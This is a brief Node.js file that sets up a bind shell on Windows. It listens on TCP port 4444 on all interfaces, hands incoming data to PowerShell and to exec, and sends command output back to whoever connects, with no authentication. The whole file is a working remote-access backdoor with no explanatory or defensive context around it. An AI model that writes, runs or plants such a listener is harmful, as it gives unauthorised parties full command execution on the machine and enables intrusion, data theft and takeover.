const net = require('net');
const { spawn, exec } = require('child_process');

console.log("> Establishing connection..")

const server = net.createServer((socket) => {
  //const proc = spawn('C:\\Windows\\System32\\cmd.exe', []);
  const proc = spawn('C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe', []);
  
  socket.pipe(proc.stdin);
  console.log("> Connection established, waiting for data")
  socket.on('data', (data) => {
    console.log('Received >', data.toString());
    exec(data.toString(), (error, stdout, stderr) => {
      console.log('> Transmitting output..');
      if (error) {
          console.log('ERROR');
          return socket.write(error.message)
      }
      if (stderr) {
          console.log('ERROR');
          return socket.write(stderr)
      }
      console.log('> Transmission successfull');
      return socket.write(stdout)
    })
  });
  socket.on("error", (err) => {
    console.log("ERROR")
    console.log(err)
  })
});

server.listen(4444, '0.0.0.0');